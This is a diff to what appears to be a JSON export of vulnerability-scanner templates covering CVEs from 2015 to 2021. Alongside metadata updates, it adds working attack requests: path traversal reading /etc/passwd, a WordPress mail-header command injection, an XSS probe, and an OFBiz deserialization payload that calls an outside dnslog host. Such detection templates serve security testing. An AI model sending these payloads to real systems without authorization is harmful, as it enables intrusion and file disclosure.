@@ -512,6 +512,41 @@
       ]
     },
     {
+      "id": "CVE-2015-3337",
+      "info": {
+        "author": "pdteam",
+        "description": "Directory traversal vulnerability in Elasticsearch before 1.4.5 and 1.5.x before 1.5.2, when a site plugin is enabled, allows remote attackers to read arbitrary files via unspecified vectors.",
+        "name": "Elasticsearch Head plugin LFI",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2015-3337",
+        "severity": "high",
+        "tags": "cve,cve2015,elastic,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/_plugin/head/../../../../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-5688",
       "info": {
         "author": "pikpikcu",
@@ -544,6 +579,54 @@
           "path": [
             "{{BaseURL}}/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
           ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-10033",
+      "info": {
+        "author": "princechaddha",
+        "name": "Wordpress 4.6 Remote Code Execution",
+        "reference": "https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html",
+        "severity": "high",
+        "tags": "wordpress,cve,cve2016,rce"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "group": 1,
+              "internal": true,
+              "name": "username",
+              "part": "body",
+              "regex": [
+                "Author:(?:[A-Za-z0-9 -\\_=\"]+)?<span(?:[A-Za-z0-9 -\\_=\"]+)?>([A-Za-z0-9]+)<\\/span>",
+                "ocation: https:\\/\\/[a-z0-9.]+\\/author\\/([a-z]+)\\/"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "wp-login.php?checkemail=confirm"
+              ]
+            },
+            {
+              "status": [
+                302
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /?author=1 HTTP/1.1\nHost: {{Hostname}}\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n",
+            "POST /wp-login.php?action=lostpassword HTTP/1.1\nHost: target(any -froot@localhost -be ${run{${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}touch${substr{10}{1}{$tod_log}}${substr{0}{1}{$spool_directory}}tmp${substr{0}{1}{$spool_directory}}success}} null)\nConnection: close\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nAccept: */*\nContent-Length: 56\nContent-Type: application/x-www-form-urlencoded\n\nwp-submit=Get+New+Password&redirect_to=&user_login={{username}}\n\n"
+          ],
+          "unsafe": true
         }
       ]
     },
@@ -646,6 +729,44 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-1000170",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "jqueryFileTree 2.1.5 and older Directory Traversal",
+        "name": "WordPress Plugin Delightful Downloads Jquery File Tree 2.1.5 Path Traversal",
+        "reference": "https://www.exploit-db.com/exploits/49693",
+        "severity": "high",
+        "tags": "cve,cve2017,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "body": "dir=%2Fetc%2F&onlyFiles=true",
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<li class='file ext_passwd'>",
+                "<a rel='/passwd'>passwd</a></li>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php"
           ]
         }
       ]
@@ -4854,7 +4975,7 @@
         "author": "joeldeleep",
         "description": "A remote code execution vulnerability exists in Microsoft SQL Server Reporting Services when it incorrectly handles page requests, aka 'Microsoft SQL Server Reporting Services Remote Code Execution Vulnerability'.",
         "name": "RCE in SQL Server Reporting Services",
-        "reference": "https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/",
+        "reference": "- https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/\n- https://github.com/euphrat1ca/CVE-2020-0618\n",
         "severity": "high",
         "tags": "cve,cve2020,rce"
       },
@@ -4929,8 +5050,9 @@
       "id": "CVE-2020-10546",
       "info": {
         "author": "madrobot",
+        "description": "rConfig 3.9.4 and previous versions has unauthenticated compliancepolicies.inc.php SQL injection. Because, by default, nodes' passwords are stored in cleartext, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.",
         "name": "rConfig 3.9.4 SQLi",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10546",
+        "reference": "- https://github.com/theguly/exploits/blob/master/CVE-2020-10546.py\n- https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/\n",
         "severity": "high",
         "tags": "cve,cve2020,rconfig,sqli"
       },
@@ -4998,8 +5120,9 @@
       "id": "CVE-2020-10548",
       "info": {
         "author": "madrobot",
+        "description": "rConfig 3.9.4 and previous versions has unauthenticated devices.inc.php SQL injection. Because, by default, nodes' passwords are stored in cleartext, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.",
         "name": "rConfig 3.9.4 SQLi",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10548",
+        "reference": "- https://github.com/theguly/exploits/blob/master/CVE-2020-10548.py\n- https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/\n",
         "severity": "high",
         "tags": "cve,cve2020,rconfig,sqli"
       },
@@ -5032,8 +5155,9 @@
       "id": "CVE-2020-10549",
       "info": {
         "author": "madrobot",
+        "description": "rConfig 3.9.4 and previous versions has unauthenticated snippets.inc.php SQL injection. Because, by default, nodes' passwords are stored in cleartext, this vulnerability leads to lateral movement, granting an attacker access to monitored network devices.",
         "name": "rConfig 3.9.4 SQLi",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10549",
+        "reference": "- https://github.com/theguly/exploits/blob/master/CVE-2020-10549.py\n- https://theguly.github.io/2020/09/rconfig-3.9.4-multiple-vulnerabilities/\n",
         "severity": "high",
         "tags": "cve,cve2020,rconfig,sqli"
       },
@@ -5144,6 +5268,7 @@
       "id": "CVE-2020-11710",
       "info": {
         "author": "pikpikcu",
+        "description": "An issue was discovered in docker-kong (for Kong) through 2.0.3. The admin API port may be accessible on interfaces other than 127.0.0.1.",
         "name": "Kong Admin Rest API Unauth",
         "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-11710",
         "severity": "info",
@@ -5978,6 +6103,7 @@
       "id": "CVE-2020-15568",
       "info": {
         "author": "pikpikcu",
+        "description": "TerraMaster TOS before 4.1.29 has Invalid Parameter Checking that leads to code injection as root. This is a dynamic class method invocation vulnerability in include/exportUser.php, in which an attacker can trigger a call to the exec method with (for example) OS commands in the opt parameter.",
         "name": "TerraMaster TOS v4.1.24 RCE",
         "reference": "https://ssd-disclosure.com/ssd-advisory-terramaster-os-exportuser-php-remote-code-execution/",
         "severity": "critical",
@@ -6047,6 +6173,7 @@
       "id": "CVE-2020-16139",
       "info": {
         "author": "pikpikcu",
+        "description": "A denial-of-service in Cisco Unified IP Conference Station 7937G 1-4-4-0 through 1-4-5-7 allows attackers restart the device remotely through sending specially crafted packets. Note: We cannot prove this vulnerability exists. Out of an abundance of caution, this CVE is being assigned to better serve our customers and ensure all who are still running this product understand that the product is end of life and should be removed or upgraded.\n",
         "name": "Cisco 7937G Denial-of-Service Reboot Attack",
         "reference": "https://blacklanternsecurity.com/2020-08-07-Cisco-Unified-IP-Conference-Station-7937G/",
         "severity": "low",
@@ -6170,6 +6297,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-17453",
+      "info": {
+        "author": "madrobot",
+        "description": "Reflected XSS vulnerability can be exploited by tampering a request parameter in Management Console. This can be performed in both authenticated and unauthenticated requests.",
+        "name": "WSO2 Carbon Management Console - XSS",
+        "reference": "https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2020-1132",
+        "severity": "medium",
+        "tags": "xss,wso2,cve2020,cve"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "'';alert('nuclei')//';"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/carbon/admin/login.jsp?msgId=%27%3Balert(%27nuclei%27)%2F%2F"
           ]
         }
       ]
@@ -6523,6 +6692,7 @@
       "id": "CVE-2020-21224",
       "info": {
         "author": "pikpikcu",
+        "description": "A Remote Code Execution vulnerability has been found in Inspur ClusterEngine V4.0. A remote attacker can send a malicious login packet to the control server",
         "name": "Inspur ClusterEngine V4.0 RCE",
         "reference": "https://github.com/NS-Sp4ce/Inspur/tree/master/ClusterEngineV4.0%20Vul",
         "severity": "critical",
@@ -6724,6 +6894,7 @@
       "id": "CVE-2020-24223",
       "info": {
         "author": "pikpikcu",
+        "description": "Mara CMS 7.5 allows cross-site scripting (XSS) in contact.php via the theme or pagetheme parameters.",
         "name": "Mara CMS  7.5 - Reflective Cross-Site Scripting",
         "reference": "https://www.exploit-db.com/exploits/48777",
         "severity": "medium",
@@ -6799,6 +6970,7 @@
       "id": "CVE-2020-24571",
       "info": {
         "author": "pikpikcu",
+        "description": "NexusQA NexusDB before 4.50.23 allows the reading of files via ../ directory traversal.",
         "name": "NexusDB v4.50.22 Path Traversal",
         "reference": "https://www.nexusdb.com/mantis/bug_view_advanced_page.php?bug_id=2371",
         "severity": "high",
@@ -6833,6 +7005,7 @@
       "id": "CVE-2020-24579",
       "info": {
         "author": "pikpikcu",
+        "description": "An issue was discovered on D-Link DSL-2888A devices with firmware prior to AU_2.31_V1.1.47ae55. An unauthenticated attacker could bypass authentication to access authenticated pages and functionality.",
         "name": "DLINK DSL 2888a RCE",
         "reference": "https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/d-link-multiple-security-vulnerabilities-leading-to-rce/",
         "severity": "medium",
@@ -7114,6 +7287,7 @@
       "id": "CVE-2020-27982",
       "info": {
         "author": "madrobot",
+        "description": "IceWarp 11.4.5.0 allows XSS via the language parameter.",
         "name": "IceWarp WebMail Reflected XSS",
         "reference": "https://packetstormsecurity.com/files/159763/Icewarp-WebMail-11.4.5.0-Cross-Site-Scripting.html",
         "severity": "medium",
@@ -7344,6 +7518,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system(%27wget%20http://example.com%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-35489",
+      "info": {
+        "author": "soyelmago",
+        "description": "The contact-form-7 (aka Contact Form 7) plugin before 5.3.2 for WordPress allows Unrestricted File Upload and remote code execution because a filename may contain special characters.",
+        "name": "WordPress Contact Form 7 Plugin - Unrestricted File Upload",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-35489",
+        "severity": "critical",
+        "tags": "cve,cve2020,wordpress,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Contact Form 7"
+              ]
+            },
+            {
+              "part": "body",
+              "regex": [
+                "^([0-4]\\.|5\\.[0-2]\\.|5\\.3\\.[0-1]$)"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/contact-form-7/readme.txt"
           ]
         }
       ]
@@ -7665,6 +7881,7 @@
         "author": "dwisiswant0",
         "description": "MAGMI versions prior to 0.7.24 are vulnerable to a remote authentication bypass due to allowing default credentials in the event there is a database connection failure.",
         "name": "Remote Auth Bypass in MAGMI (Magento Mass Importer) Plugin <= v0.7.23",
+        "reference": "https://github.com/dweeves/magmi-git/blob/18bd9ec905c90bfc9eaed0c2bf2d3525002e33b9/magmi/inc/magmi_auth.php#L35",
         "severity": "high",
         "tags": "cve,cve2020,magmi"
       },
@@ -7732,7 +7949,9 @@
       "id": "CVE-2020-5902",
       "info": {
         "author": "madrobot & dwisiswant0 & ringo",
+        "description": "In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.",
         "name": "F5 BIG-IP TMUI RCE",
+        "reference": "- http://packetstormsecurity.com/files/158333/BIG-IP-TMUI-Remote-Code-Execution.html\n- http://packetstormsecurity.com/files/158334/BIG-IP-TMUI-Remote-Code-Execution.html\n- http://packetstormsecurity.com/files/158366/F5-BIG-IP-TMUI-Directory-Traversal-File-Upload-Code-Execution.html\n- http://packetstormsecurity.com/files/158414/Checker-CVE-2020-5902.html\n- http://packetstormsecurity.com/files/158581/F5-Big-IP-13.1.3-Build-0.0.6-Local-File-Inclusion.html\n- https://badpackets.net/over-3000-f5-big-ip-endpoints-vulnerable-to-cve-2020-5902/\n- https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902\n- https://support.f5.com/csp/article/K52145254\n- https://swarm.ptsecurity.com/rce-in-f5-big-ip/\n- https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/\n- https://www.kb.cert.org/vuls/id/290915\n",
         "severity": "high",
         "tags": "cve,cve2020,bigip,rce"
       },
@@ -8008,7 +8227,9 @@
       "id": "CVE-2020-8115",
       "info": {
         "author": "madrobot & dwisiswant0",
+        "description": "A reflected XSS vulnerability has been discovered in the publicly accessible afr.php delivery script of Revive Adserver <= 5.0.3 by Jacopo Tediosi. There are currently no known exploits: the session identifier cannot be accessed as it is stored in an http-only cookie as of v3.2.2. On older versions, however, under specific circumstances, it could be possible to steal the session identifier and gain access to the admin interface. The query string sent to the www/delivery/afr.php script was printed back without proper escaping in a JavaScript context, allowing an attacker to execute arbitrary JS code on the browser of the victim.\n",
         "name": "Revive Adserver XSS",
+        "reference": "- https://hackerone.com/reports/775693\n- https://www.revive-adserver.com/security/revive-sa-2020-001/\n",
         "severity": "medium",
         "tags": "cve,cve2020,xss"
       },
@@ -8240,7 +8461,7 @@
         "author": "pdnuclei & dwisiswant0",
         "description": "In IceWarp Webmail Server through 11.4.4.1, there is XSS in the /webmail/ color parameter.",
         "name": "IceWarp WebMail XSS",
-        "reference": "https://www.exploit-db.com/exploits/47988",
+        "reference": "- https://www.exploit-db.com/exploits/47988\n- https://twitter.com/sagaryadav8742/status/1275170967527006208\n",
         "severity": "medium",
         "tags": "cve,cve2020,xss"
       },
@@ -8280,8 +8501,9 @@
       "id": "CVE-2020-8515",
       "info": {
         "author": "pikpikcu",
+        "description": "DrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta, and 1.4.4_Beta devices allow remote code execution as root (without authentication) via shell metacharacters to the cgi-bin/mainfunction.cgi URI. This issue has been fixed in Vigor3900/2960/300B v1.5.1.",
         "name": "DrayTek pre-auth RCE",
-        "reference": "https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices-en/",
+        "reference": "- https://www.draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-web-management-page-vulnerability-(cve-2020-8515)\n- https://blog.netlab.360.com/two-zero-days-are-targeting-draytek-broadband-cpe-devices-en/\n",
         "severity": "critical",
         "tags": "cve,cve2020,rce"
       },
@@ -8412,6 +8634,7 @@
         "author": "madrobot",
         "description": "Subversion ALM for the enterprise before 8.8.2 allows reflected XSS at multiple locations.",
         "name": "Jira Subversion ALM for enterprise XSS",
+        "reference": "- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9344\n- https://kintosoft.atlassian.net/wiki/spaces/SVNALM/pages/753565697/Security+Bulletin\n- https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-007.txt\n",
         "severity": "medium",
         "tags": "cve,cve2020,atlassian,jira,xss"
       },
@@ -8501,8 +8724,9 @@
       "id": "CVE-2020-9425",
       "info": {
         "author": "madrobot",
+        "description": "An issue was discovered in includes/head.inc.php in rConfig before 3.9.4. An unauthenticated attacker can retrieve saved cleartext credentials via a GET request to settings.php. Because the application was not exiting after a redirect is applied, the rest of the page still executed, resulting in the disclosure of cleartext credentials in the response.",
         "name": "rConfig Unauthenticated Sensitive Information Disclosure",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-9425",
+        "reference": "- https://blog.hivint.com/rconfig-3-9-3-unauthenticated-sensitive-information-disclosure-ead4ed88f153\n- https://github.com/rconfig/rconfig/commit/20f4e3d87e84663d922b937842fddd9af1b68dd9\n",
         "severity": "high",
         "tags": "cve,cve2020,rconfig"
       },
@@ -8537,8 +8761,9 @@
       "id": "CVE-2020-9483",
       "info": {
         "author": "pikpikcu",
+        "description": "When use H2/MySQL/TiDB as Apache SkyWalking storage, the metadata query through GraphQL protocol, there is a SQL injection vulnerability, which allows to access unpexcted data. Apache SkyWalking 6.0.0 to 6.6.0, 7.0.0 H2/MySQL/TiDB storage implementations don't use the appropriate way to set SQL parameters.\n",
         "name": "SkyWalking SQLI",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-9483",
+        "reference": "https://github.com/apache/skywalking/pull/4639",
         "severity": "high",
         "tags": "cve,cve2020,sqli,skywalking"
       },
@@ -8747,8 +8972,9 @@
       "id": "CVE-2021-21315",
       "info": {
         "author": "pikpikcu",
+        "description": "The System Information Library for Node.JS (npm package \"systeminformation\") is an open source collection of functions to retrieve detailed hardware, system and OS information. In systeminformation before version 5.3.1 there is a command injection vulnerability. Problem was fixed in version 5.3.1. As a workaround instead of upgrading, be sure to check or sanitize service parameters that are passed to si.inetLatency(), si.inetChecksite(), si.services(), si.processLoad() ... do only allow strings, reject any arrays. String sanitation works as expected.",
         "name": "Node.js Systeminformation Command Injection",
-        "reference": "https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC",
+        "reference": "- https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC\n- https://security.netapp.com/advisory/ntap-20210312-0007/\n",
         "severity": "high",
         "tags": "nodejs,cve,cve2021"
       },
@@ -8875,7 +9101,9 @@
       "id": "CVE-2021-22122",
       "info": {
         "author": "dwisiswant0",
+        "description": "An improper neutralization of input during web page generation in FortiWeb GUI interface 6.3.0 through 6.3.7 and version before 6.2.4 may allow an unauthenticated, remote attacker to perform a reflected cross site scripting attack (XSS) by injecting malicious payload in different vulnerable API end-points.",
         "name": "FortiWeb v6.3.x-6.2.x Unauthenticated XSS",
+        "reference": "- https://www.fortiguard.com/psirt/FG-IR-20-122\n- https://twitter.com/ptswarm/status/1357316793753362433\n",
         "severity": "medium",
         "tags": "cve,cve2021,fortiweb,xss"
       },
@@ -9075,9 +9303,53 @@
       ]
     },
     {
+      "id": "CVE-2021-26295",
+      "info": {
+        "author": "madrobot",
+        "description": "Apache OFBiz has unsafe deserialization prior to 17.12.06. An unauthenticated attacker can use this vulnerability to successfully take over Apache OFBiz.",
+        "name": "Apache OFBiz RMI deserializes Arbitrary Code Execution",
+        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26295",
+        "severity": "critical",
+        "tags": "apache,cve,cve2021,rce,ofbiz"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "OFBiz.Visitor="
+              ]
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "deserializing",
+                "errorMessage"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /webtools/control/SOAPService HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36\nConnection: close\nContent-Type: application/xml\nContent-Length: 910\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n<soapenv:Header/>\n<soapenv:Body>\n<ser>\n<map-HashMap>\n<map-Entry>\n<map-Key>\n<cus-obj>bcc62005737220116a6176612e7574696c2e486173684d617005070c341c16606403200246200a6c6f6164466163746f724920097468726573686f6c6478703f4020202020200c770820202010202020017372200c6a6176612e6e65742e55524cfb2537361a7fa37203200749200868617368436f6465492004706f72744c2009617574686f726974797420124c6a6176612f6c616e672f537472696e673b4c200466696c6571207e20034c2004686f737471207e20034c200870726f746f636f6c71207e20034c200372656671207e20037870a0a0a0a0a0a0a0a07420107435336c71392e646e736c6f672e636e7420012f71207e2005742004687474707078742018687474703a2f2f7435336c71392e646e736c6f672e636e2f780a</cus-obj>\n</map-Key>\n<map-Value>\n<std-String value=\"http://t53lq9.dnslog.cn/\"></std-String>\n</map-Value>\n</map-Entry>\n</map-HashMap>\n</ser>\n</soapenv:Body>\n</soapenv:Envelope>\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-26710",
       "info": {
         "author": "pikpikcu",
+        "description": "A cross-site scripting (XSS) issue in the login panel in Redwood Report2Web 4.3.4.5 and 4.5.3 allows remote attackers to inject JavaScript via the signIn.do urll parameter.",
         "name": "Redwood v4.3.4.5-v4.5.3 XSS",
         "reference": "https://vict0ni.me/report2web-xss-frame-injection.html",
         "severity": "medium",
@@ -9119,9 +9391,10 @@
       "id": "CVE-2021-26722",
       "info": {
         "author": "pikpikcu",
+        "description": "LinkedIn Oncall through 1.4.0 allows reflected XSS via /query because of mishandling of the \"No results found for\" message in the search bar.",
         "issues": "https://github.com/linkedin/oncall/issues/341",
         "name": "LinkedIn Oncall 1.4.0 XSS",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-26722",
+        "reference": "https://github.com/linkedin/oncall/issues/341",
         "severity": "medium",
         "tags": "cve,cve2021,linkedin,xss"
       },
@@ -9161,8 +9434,9 @@
       "id": "CVE-2021-26723",
       "info": {
         "author": "pikpikcu",
+        "description": "Jenzabar 9.2.x through 9.2.2 allows /ics?tool=search&query= XSS.",
         "name": "Jenzabar v9.20-v9.2.2 XSS",
-        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-26723",
+        "reference": "- http://packetstormsecurity.com/files/161303/Jenzabar-9.2.2-Cross-Site-Scripting.html\n- https://gist.github.com/Y0ung-DST/d1b6b65be6248b0ffc2b2f2120deb205\n- https://jenzabar.com/blog\n- https://y0ungdst.medium.com/xss-in-jenzabar-cve-2021-26723-a0749231328\n",
         "severity": "medium",
         "tags": "cve,cve2021,jenzabar,xss"
       },
@@ -9276,6 +9550,7 @@
       "id": "CVE-2021-27330",
       "info": {
         "author": "pikpikcu",
+        "description": "Triconsole Datepicker Calendar <3.77 is affected by cross-site scripting (XSS) in calendar_form.php. Attackers can read authentication cookies that are still active, which can be used to perform further attacks such as reading browser history, directory listings, and file contents.",
         "name": "Triconsole 3.75 XSS",
         "reference": "https://www.exploit-db.com/exploits/49597",
         "severity": "medium",
@@ -9317,8 +9592,9 @@
       "id": "CVE-2021-3019",
       "info": {
         "author": "pikpikcu",
+        "description": "ffay lanproxy 0.1 allows Directory Traversal to read /../conf/config.properties to obtain credentials for a connection to the intranet.",
         "name": "Lanproxy Directory Traversal",
-        "reference": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3019",
+        "reference": "- https://github.com/ffay/lanproxy/commits/master\n- https://github.com/maybe-why-not/lanproxy/issues/1\n",
         "severity": "medium",
         "tags": "cve,cve2021,lanproxy,lfi"
       },
